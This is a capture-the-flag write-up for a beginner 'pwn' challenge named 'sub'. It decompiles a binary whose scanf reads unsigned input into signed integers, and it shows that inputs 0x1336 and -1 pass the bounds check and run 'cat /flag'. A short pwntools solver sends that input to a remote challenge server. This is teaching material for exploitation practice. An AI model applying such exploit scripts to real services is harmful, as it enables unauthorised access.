# Sub

<img align="left" width="100" height="24" src="https://img.shields.io/badge/category-pwn-blueviolet"><br></br>

# Synopsis

2 negatives == 1 positive.

# Description

Do you know basic math?        

## Skills Required

- Basic math.

## Skills Learned

- Basic math.

# Enumeration

The program's interface: 

```console
sub git:master ❯ ./sub_xyz                                       
1337 input: 1337
1337
```

From the interface, we understand the the program takes 2 numbers. Let's head into the disassembly.

### Disassembly

Starting with `main()`:

```c
undefined8 FUN_00100850(void)

{
  long in_FS_OFFSET;
  int input_1;
  int input_2;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  input_1 = 0;
  input_2 = 0;
  __printf_chk(1,"1337 input: ");
  __isoc99_scanf("%u %u",&input_1,&input_2);
  if ((input_1 < 0x1337) && (input_2 < 0x1337)) {
    if (input_1 - input_2 == 0x1337) {
      system("cat /flag");
    }
  }
  else {
    puts("Sowwy");
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

The program is pretty straightforward and the bug is obvious. 

`  __isoc99_scanf("%u %u",&input_1,&input_2);`

The program asks for 2 unsigned integers, that means we can give a signed integer and the program will not treat it properly. Then, we need to make sure that our inputs are `< 0x1337` and when they are subtracted, they are equal to `0x1337`. 

The most obvious numbers are `0x1336` and `-1`. Both are less than `0x1337` and the program will do:

 `0x1336 - (-1) => 0x1336 + 1 == 0x1337`.

# Solution

```python
#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.log_level = 'critical'

LOCAL = False

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote('svc.pwnable.xyz', 30001)

r.sendlineafter('input: ', f'{0x1336} -1')
r.interactive()

```

```console
sub git:master ❯ python solver.py                                 
FLAG{REDACTED}$
```

